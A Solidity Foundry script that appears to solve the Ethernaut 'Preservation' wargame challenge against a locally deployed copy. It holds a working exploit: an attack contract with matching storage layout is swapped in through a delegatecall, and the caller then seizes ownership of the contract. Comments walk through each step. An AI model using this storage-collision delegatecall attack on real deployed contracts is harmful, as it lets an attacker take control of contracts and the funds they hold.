// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Preservation, LibraryContract} from "../src/Preservation.sol";

contract PreservationSolution is Script {
    // $ forge script script/Preservation.s.sol --tc PreservationSolution -vvvv

    Preservation preservationInstance;
    PreservationAttack attackContract;

    function run() external {
        // Deploy Two Lib contracts, then deploying `Preservation` contract
        LibraryContract timeLib1 = new LibraryContract();
        LibraryContract timeLib2 = new LibraryContract();
        preservationInstance = new Preservation(address(timeLib1),address(timeLib2));

        // - To claim the ownership of the contract we need to change the owner value, which lies on the 2nd storage slot.
        // - `Preservation` contract makes delegate calls to time libs, so it seems we can easily change the values.
        // - The problem is that the timeLib contract changes the 0 storage slot variable only `storedTime`.
        // - To be able to change the target contract `Preservation`, we will do two steps.
        // - 1. We will change the address of the first timeLib address to another address by calling `setFirstTime`.
        // - In the new timeLib contract, we will make `setTime(uint256)` function change the 2nd slot value in the storage.
        // - 2. We will recall `Preservation::setFirstTime`, and now it will change the 2nd storage slot value instead of the first one. Remember we changed the Lib contract address.
        // - We will be the owner of the `Preservation` contract, and we will pass the challenge.

        // Deploy the attack contract
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        vm.deal(attacker, 0.1 ether);

        console.log("------- ATTACK WILL HAPPEN ----------");

        console.log("Preservation owner:", preservationInstance.owner());
        console.log("Preservation Lib1:", preservationInstance.timeZone1Library());
        attackContract = new PreservationAttack();

        console.log("Changing The firstLib contract...");
        preservationInstance.setFirstTime(uint256(uint160(address(attackContract))));
        console.log("Preservation Lib1:", preservationInstance.timeZone1Library());

        console.log("Changing The owner...");
        preservationInstance.setFirstTime(uint256(uint160(attacker)));
        console.log("Preservation owner:", preservationInstance.owner());

        vm.stopPrank();
    }
}

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function setTime(uint256 time) public {
        owner = address(uint160(time));
    }
}
